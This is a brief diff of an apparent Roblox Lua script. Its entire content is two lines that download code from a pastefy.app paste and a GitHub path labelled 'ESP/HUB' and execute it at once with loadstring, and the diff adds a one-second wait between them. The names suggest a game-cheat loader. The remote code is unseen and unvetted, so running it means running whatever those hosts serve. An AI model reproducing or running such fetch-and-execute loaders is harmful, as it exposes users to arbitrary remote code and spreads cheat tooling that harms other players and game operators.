@@ -1,7 +1,6 @@
-coroutine.wrap(function()
-    loadstring(game:HttpGet("https://pastefy.app/VQwXim3w/raw"))()
-end)()
+loadstring(game:HttpGet("https://pastefy.app/VQwXim3w/raw"))()
 
-coroutine.wrap(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
-end)()
+-- Wait 1 second before running the next script
+task.wait(1) 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
